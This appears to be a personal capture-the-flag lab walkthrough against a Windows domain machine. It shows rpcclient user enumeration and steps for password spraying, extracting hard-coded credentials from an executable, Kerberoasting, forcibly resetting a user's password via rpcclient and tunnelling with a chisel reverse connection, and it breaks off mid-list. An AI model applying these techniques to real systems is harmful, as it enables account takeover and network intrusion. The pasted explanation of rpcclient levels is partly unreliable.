
![image](https://github.com/user-attachments/assets/2e8337d8-f6cb-4c3a-8816-1129b8263f99)
![image](https://github.com/user-attachments/assets/e4dc7324-0148-41cc-8da8-bf5ca898b0fc)
![image](https://github.com/user-attachments/assets/7e4417b9-0c66-4c08-bf7a-fa4e23f12185)
![image](https://github.com/user-attachments/assets/8909ecd9-97bd-46d6-bab0-d6b0ae65b6da)
![image](https://github.com/user-attachments/assets/186c04c2-f5d7-4c7e-932c-161c77b7b966)
![image](https://github.com/user-attachments/assets/0657932d-f33f-48c9-80e6-c6920e0f8188)
![image](https://github.com/user-attachments/assets/b6bab0fe-71fb-46b2-913b-d5c049eb9a7d)
![image](https://github.com/user-attachments/assets/07737a64-d19f-47b4-8aa3-82809a097b65)
![image](https://github.com/user-attachments/assets/cec77848-63fa-4fb7-84cf-5bcebf20aa96)
![image](https://github.com/user-attachments/assets/0f1fece0-9a28-45d4-8cb2-b444e07041ec)
![image](https://github.com/user-attachments/assets/c7236729-5f98-4faf-89f0-acd63d52dcba)
![image](https://github.com/user-attachments/assets/9654e838-5759-44dc-b974-82b748215a10)
![image](https://github.com/user-attachments/assets/8aa3e6fa-5fd8-416d-80bf-56495445d6b0)
![image](https://github.com/user-attachments/assets/3ea5fbe1-8d05-4308-8c71-55858588a1f9)
![image](https://github.com/user-attachments/assets/c0904506-69f1-403e-9724-af34ea1dbb93)
![image](https://github.com/user-attachments/assets/88527838-2a47-4325-a151-128049d13370)
![image](https://github.com/user-attachments/assets/74f09e31-a604-4c95-8212-b7bd7d969920)
![image](https://github.com/user-attachments/assets/e2ee4dc3-1b0e-4b8a-8205-afad5e452f2a)
![image](https://github.com/user-attachments/assets/84e0b467-ad14-47e7-890c-63af9e5e3f9a)
![image](https://github.com/user-attachments/assets/8b50dfa9-6dff-4d10-ba2e-62a113e7fdac)
![image](https://github.com/user-attachments/assets/b896e409-9b12-4839-abec-18af7d05faac)
![image](https://github.com/user-attachments/assets/8d3db80e-1ec3-4124-be1f-fd7f137598a1)
![image](https://github.com/user-attachments/assets/f7ae538b-e3d7-4656-bd78-1d788d2f09d0)
![image](https://github.com/user-attachments/assets/a1e7d0d5-34de-4d5b-ad5f-9194a25317b3)
![image](https://github.com/user-attachments/assets/869f244f-5491-4cb2-8b6b-52a2602f91f5)
![image](https://github.com/user-attachments/assets/f4a2faa0-ce3a-4c5e-bfc9-a3237940d792)
![image](https://github.com/user-attachments/assets/d09bd766-06bb-43fb-bec1-2876b5b81fdb)
![image](https://github.com/user-attachments/assets/9f71f69b-c8cf-4a26-9e40-fec21b399b29)
![image](https://github.com/user-attachments/assets/0387330d-ec7d-4c89-9b92-a9d55d7fd28c)
```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[svc_helpdesk] rid:[0x450]
user:[Matthew.Harrison] rid:[0x452]
user:[Emma.Miah] rid:[0x453]
user:[Rebecca.Bell] rid:[0x454]
user:[Scott.Gardner] rid:[0x455]
user:[Terry.Edwards] rid:[0x456]
user:[Holly.Matthews] rid:[0x457]
user:[Anne.Jenkins] rid:[0x458]
user:[Brett.Naylor] rid:[0x459]
user:[Melissa.Mitchell] rid:[0x45a]
user:[Craig.Carr] rid:[0x45b]
user:[Fiona.Clark] rid:[0x45c]
user:[Patrick.Martin] rid:[0x45d]
user:[Kate.Watson] rid:[0x45e]
user:[Kirsty.Norris] rid:[0x45f]
user:[Andrea.Hayes] rid:[0x460]
user:[Abigail.Hughes] rid:[0x461]
user:[Melanie.Watson] rid:[0x462]
user:[Frances.Ward] rid:[0x463]
user:[Sylvia.King] rid:[0x464]
user:[Wayne.Hartley] rid:[0x465]
user:[Iain.White] rid:[0x467]
user:[Joanna.Wood] rid:[0x468]
user:[Bethan.Webster] rid:[0x469]
user:[Elaine.Brady] rid:[0x46b]
user:[Christopher.Lewis] rid:[0x46c]
user:[Megan.Johnson] rid:[0x46d]
user:[Damien.Chapman] rid:[0x46e]
user:[Joanne.Lewis] rid:[0x46f]
user:[svc_mssql] rid:[0x470]
user:[svc_tpl] rid:[0x471]
user:[svc_web] rid:[0x472]
rpcclient $> queryusergroups 0x452
        group rid:[0x201] attr:[0x7]
        group rid:[0x451] attr:[0x7]
rpcclient $> queryusergroups 0x453
        group rid:[0x201] attr:[0x7]
        group rid:[0x451] attr:[0x7]
rpcclient $> queryusergroups 0x454
        group rid:[0x201] attr:[0x7]
        group rid:[0x451] attr:[0x7]
rpcclient $> queryusergroups 0x455
        group rid:[0x201] attr:[0x7]
        group rid:[0x451] attr:[0x7]
rpcclient $> queryusergroups 0x456
        group rid:[0x201] attr:[0x7]
        group rid:[0x451] attr:[0x7]
rpcclient $> queryusergroups 0x457
        group rid:[0x201] attr:[0x7]
        group rid:[0x451] attr:[0x7]
rpcclient $> queryusergroups 0x458
        group rid:[0x201] attr:[0x7]
        group rid:[0x451] attr:[0x7]
rpcclient $> queryusergroups 0x459
        group rid:[0x201] attr:[0x7]
        group rid:[0x451] attr:[0x7]
rpcclient $> queryusergroups 0x460
        group rid:[0x201] attr:[0x7]
        group rid:[0x451] attr:[0x7]
rpcclient $> queryusergroups 0x461
        group rid:[0x201] attr:[0x7]
        group rid:[0x451] attr:[0x7]
rpcclient $> queryusergroups 0x462
        group rid:[0x201] attr:[0x7]
        group rid:[0x451] attr:[0x7]
rpcclient $> queryusergroups 0x463
        group rid:[0x201] attr:[0x7]
        group rid:[0x451] attr:[0x7]
rpcclient $> queryusergroups 0x464
        group rid:[0x201] attr:[0x7]
        group rid:[0x451] attr:[0x7]
rpcclient $> queryusergroups 0x465
        group rid:[0x201] attr:[0x7]
        group rid:[0x451] attr:[0x7]
rpcclient $> queryusergroups 0x466
result was NT_STATUS_NO_SUCH_USER
rpcclient $> queryusergroups 0x467
        group rid:[0x201] attr:[0x7]
        group rid:[0x466] attr:[0x7]
rpcclient $> queryusergroups 0x468
        group rid:[0x201] attr:[0x7]
        group rid:[0x466] attr:[0x7]
rpcclient $> queryusergroups 0x469
        group rid:[0x201] attr:[0x7]
        group rid:[0x466] attr:[0x7]
rpcclient $> queryusergroups 0x46b
        group rid:[0x201] attr:[0x7]
        group rid:[0x46a] attr:[0x7]
rpcclient $> queryusergroups 0x46c
        group rid:[0x201] attr:[0x7]
        group rid:[0x46a] attr:[0x7]
        group rid:[0x451] attr:[0x7]
rpcclient $> queryusergroups 0x46d
        group rid:[0x201] attr:[0x7]
        group rid:[0x46a] attr:[0x7]
rpcclient $> queryusergroups 0x46e
        group rid:[0x201] attr:[0x7]
        group rid:[0x46a] attr:[0x7]
rpcclient $> queryusergroups 0x46f
        group rid:[0x201] attr:[0x7]
        group rid:[0x46a] attr:[0x7]
rpcclient $> queryusergroups 0x470
        group rid:[0x201] attr:[0x7]
rpcclient $> queryusergroups 0x471
        group rid:[0x201] attr:[0x7]
rpcclient $> queryusergroups 0x472
        group rid:[0x201] attr:[0x7]
rpcclient $> 
```
![image](https://github.com/user-attachments/assets/7ba66983-72c6-42f7-adbc-1cc5d7c9f767)
![image](https://github.com/user-attachments/assets/16956a2e-f97a-47ae-9ef7-3f39dcb955d9)
![image](https://github.com/user-attachments/assets/b5d06cca-83ee-4650-b5a5-02f4f0492012)
![image](https://github.com/user-attachments/assets/0b28c01b-8d3f-4906-a19d-26408855c8d6)
![image](https://github.com/user-attachments/assets/8d914551-5f15-4147-9dbd-22513a77b6da)
![image](https://github.com/user-attachments/assets/63fcf5cf-8627-4316-8eb2-9490d13a5e32)

Take a break.



1. website --> Team --> list of team members --> generate user list

2. brute force SMB (crackmapexec -u users.txt -p rockyou.txt) --> no valid user:password

3. enum4linux-ng --> no useful info

4. crackmapexec SMB again with -p 'nagoya', 'Nagoya', 'nagoya2023', 'Nagoya2023' (website built in 2023)

5. valid creds Andrea.Hayes:Nagoya2023

6. crackmapexec winrm --> fail, crackmapexec rdp --> error --> try nxc rdp --> valid

7. RDP with Andrea.Hayes:Nagoya2023 --> fail

8. smbclient --> get ResetPassword info (.exe and .exe.config)

9. cat ResetPassword.exe.config --> no useful info

10. strings ResetPassword.exe --> no useful info

11. check ResetPassword.exe with dnSpy.exe --> wine dnSpy.exe --> open ResetPassword.exe --> get username svc_helpdesk and password U299iYRmikYTHDbPbxPoYYfa2j4x4cdg

12. svc_helpdesk creds not get into machine

13. cannot find entry point --> try impacket-GetUserSPNs with Andrea.Hayes:Nagoya2023 --> get two usernames: svc_helpdesk and svc_mssql

14. get kerberoast and crack --> svc_mssql password is Service1

15. rpcclient with svc_helpdesk cred --> get domain users and domain groups

16. queryusergroups to check which groups each user is in --> user Christopher.Lewis (0x46c) in 3 groups (domain user, developer and employee groups), all others only in 1 or 2 groups

17.
```
In the rpcclient tool, the setuserinfo function is used to modify user account information on a remote Windows system. The level parameter in this context refers to the level of information detail that you want to modify or retrieve when working with user account data.
Commonly used levels for user account information include:

Level 0: Basic information, such as username and full name.

Level 1: Additional information, including home directory, script path, and profile path.

Level 2: Further information, like password age, privileges, and logon script.

Level 3: Detailed information, including all the above and group memberships.

Level 4: Even more detailed information, including all the above and security identifier (SID).

To set a user's password using the rpcclient tool, you would typically use setuserinfo2 function with a level of 23.

The level parameter corresponds to the level of user information that you're modifying, and for changing passwords, the relevant level is 23. Level 23 includes all the attributes from level 1 (which provides basic user information) and adds the ability to modify the user's password.

The setuserinfo function in rpcclient is typically used to modify user account information, but it might not directly support changing passwords. To change a user's password using rpcclient, the setuserinfo2 function with level 23 is the recommended approach.

The setuserinfo2 function with level 23 allows you to modify password-related information, including changing the user's password. Level 23 includes all the attributes from level 1 and provides the additional functionality to manage passwords.

While some versions of rpcclient might support changing passwords using setuserinfo with certain parameters, it's safer and more consistent to use setuserinfo2 with level 23 for password changes.
```
18. reset Christopher.Lewis password to Password123

19. Evil-WinRM into machine with Christopher.Lewis new password --> get local.txt flag

20. already get svc_mssql username and password from previous steps, directory svc_mssql under C:\Users\ but initial port scan no mssql port 1433 open

21. netstat -ano | findstr LISTENING --> check open ports --> port 1433 is listening

22. port forwarding:
````
# kali machine
chisel server --port 445 --reverse
# target machine
cmd /c chisel.exe <serverIP:port> R:<kali port to forward to>:127.0.0.1:<local port to forward>
chisel.exe client $KaliIP:445 R:1433:127.0.0.1:1433
````
23. 
